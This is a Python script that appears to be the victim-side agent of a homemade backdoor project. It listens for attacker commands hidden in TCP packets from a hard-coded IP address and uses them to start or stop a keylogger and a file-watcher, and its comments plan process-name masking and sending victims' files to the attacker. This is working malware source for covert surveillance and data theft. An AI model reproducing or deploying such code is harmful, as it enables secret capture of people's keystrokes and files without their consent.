#!/usr/bin/env python3

"""
- Create attacker/victim programs
- Mask process name
- Probably use covert channel

- Menu:
    - Start/stop keylogger
    - Transfer file from victim to attacker
    - Start/stop watching file for changes. If change, transfer to attacker
    - Start/stop watching directory. If change, transfer to attacker

"""


import multiprocessing
from scapy.all import *
from multiprocessing import Process
import sys
import keylog as keylogger
import watchfile as watchfile


is_running = False
process_list = []


def exec_function(mode, *args):
    global is_running
    global process_list

    # Start functions
    if is_running == False:
        if mode == "keylog":
            print("Activate: ", mode)
            is_running = True
            keylogger.start_keylogger()
        
        elif mode == "watchfile":
            print("Activate: ", mode)
            is_running = True

            filename = args[0]
            p = multiprocessing.Process(target=watchfile.start_watchfile, args=(filename,))
            process_list.append(p)
            process_list[0].start()

        elif mode == "watchdir":
            print("Activate: ", mode)
            is_running = True

        else:
            return

    # Stop functions
    elif is_running == True:
        if mode == "keylog":
            print("Stop: ", mode)
            is_running = False
            keylogger.stop_keylogger()

        if mode == "watchfile":
            print("Stop: ", mode)
            is_running = False
            # os.kill(os.getpid(), signal.SIGINT)
            # watchfile.stop_watchfile()
            process_list[0].terminate()

        if mode == "watchdir":
            print("Stop: ", mode)
            is_running = False
            return

        else:
            return


def read_pkt(packet):
    global is_running

    payload = packet[Raw].load.decode("utf-8")
    payload_split = payload.split("|")

    # print(payload_split)

    if len(payload_split) > 1:
        data = payload_split[1]

    # Parse functionality from attacker
    func = payload_split[0]

    if func == "quit":
        print("Shutdown signal received - exiting...")
        sys.exit()
    else:
        exec_function(func, data)


def main():
    print("Listening...\n")

    while True:
        sniff(filter="ip and tcp and host 192.168.1.75 and dst port 8505", count=1, prn=read_pkt)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Exiting program...")
        sys.exit()
